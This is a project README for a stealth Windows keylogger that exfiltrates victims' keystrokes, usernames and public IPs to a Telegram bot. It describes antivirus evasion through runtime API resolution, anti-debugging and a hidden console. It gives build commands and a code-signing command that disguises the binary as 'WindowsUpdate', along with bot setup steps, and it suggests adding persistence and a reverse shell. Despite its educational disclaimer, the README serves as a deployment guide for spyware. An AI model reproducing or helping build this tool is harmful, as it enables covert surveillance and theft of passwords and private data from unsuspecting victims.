# 🧩 Windows Keylogger with Telegram Exfiltration (WinHTTP, C++17)

> ⚠️ **Disclaimer**  
> This project is for **educational and security research purposes only**.  
> **Unauthorized use** against systems you do not own or operate with explicit permission is **illegal and prohibited**.

---

## 📌 Overview

This project is a stealth-focused Windows keylogger written in **C++17**, leveraging the **Windows API** and **WinHTTP** to exfiltrate keystroke data securely to **Telegram**.

### 🔐 Core Capabilities:
- Captures all keystrokes via `WH_KEYBOARD_LL` hook.
- Securely exfiltrates data using **WinHTTP** to a private **Telegram bot**.
- Evades antivirus detection using **manual API resolution** (`LoadLibraryA` + `GetProcAddress`).
- Generates a unique victim ID using `CoCreateGuid`.
- Runs silently in the background (hidden console).
- Implements **anti-debugging** via `IsDebuggerPresent`.

---

## ⚙️ Features

✅ No static API imports — all Windows APIs are resolved at runtime.  
✅ Native `WinHTTP` for HTTP(S) communication (no external libraries).  
✅ Anti-debugging check — exits if debugger is detected.  
✅ Multi-threaded design for log handling.  
✅ Infinite message loop to persist process invisibly.  
✅ Graceful cleanup on exit.

---

## 🏗️ Build Instructions (Linux → Windows)

### 🔧 Requirements (Debian / Ubuntu / Kali)

Install the MinGW cross-compiler:
```bash
sudo apt update
sudo apt install g++-mingw-w64-x86-64
```
🧱 Compile the Keylogger
```bash
x86_64-w64-mingw32-g++ -std=c++17 update.cpp -o update.exe \
  -static-libgcc -static-libstdc++ \
  -lwinhttp -luser32 -lrpcrt4 -lole32 -ladvapi32
```
🔏 Sign the Executable
```bash
osslsigncode sign \
  -certs mycert.pem \
  -key mykey.pem \
  -n "WindowsUpdate" \
  -i http://microsoft.com \
  -t http://timestamp.sectigo.com \
  -in update.exe \
  -out updateasus.exe
```
🤖 Telegram Bot Setup
To enable Telegram exfiltration, edit the following lines in update.cpp:
const std::string BOT_TOKEN_PLAINTEXT = "REPLACE_WITH_YOUR_TOKEN";
const std::string CHAT_ID_PLAINTEXT = "REPLACE_WITH_YOUR_CHAT_ID";

---
🔁 Steps:
1.Create a bot via @BotFather on Telegram.
2.Start a chat with your bot.
3.Visit or search @userinfobot >to get chat-id
4.Replace both placeholders in the code.
5.Recompile the binary.

🧪 Runtime Behavior
Sends "target online" notification to your Telegram bot.
Shares:
Victim's GUID
Username
Public IP
Captures and periodically exfiltrates keystrokes.
Hides the console window on launch.
Self-terminates if any debugger is detected.

🔍 Legal Disclaimer
This project is created for the following use cases:
🔬 Malware reverse engineering practice
🛡️ Cybersecurity education
🧪 Red team simulation on authorized systems only
Do not deploy on systems you do not own or without consent.
The developer assumes no responsibility for any misuse.

📌 Additional Notes
❌ No use of WinINet, Boost, or cURL.
✅ Fully written in pure C++17 using low-level Windows API.
🔧 Can be extended with:
Screenshot capture
Registry persistence
Reverse shell or remote execution


**Stay safe. Test responsibly. Learn deeply.**

